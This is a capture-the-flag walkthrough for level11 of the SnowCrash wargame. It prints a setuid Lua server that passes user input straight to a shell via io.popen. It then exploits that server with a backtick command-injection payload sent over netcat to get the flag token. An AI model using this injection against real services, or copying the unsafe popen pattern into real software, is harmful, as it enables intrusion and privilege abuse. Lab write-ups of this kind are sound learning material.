$> ls -la
We have a level11.lua file
$> level11@SnowCrash:~$ file level11.lua 
level11.lua: setuid setgid a lua script, ASCII text executable

When we try to execute it:
level11@SnowCrash:~$ ./level11.lua 
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?

Lua is a scripting language
$> level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end


There is a server on localhost:5151
We can try listening to that port
$> nc localhost 5151
we are prompted for a password
level11@SnowCrash:~$ nc localhost 5151
Password: hello
Erf nope..

We see that the password entered is hashed, using sha1 sum, decoding f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 gives us NotSoEasy...

In the hash function, there is an echo of the password entered, let's try to redirect the output
$> level11@SnowCrash:~$ nc localhost 5151
Password: lala > /tmp/test
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
lala

We do have the password we entered.
Let's try with a command:
level11@SnowCrash:~$ nc localhost 5151
Password: `getflag` > /tmp/test
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

We have the flag --> su level12
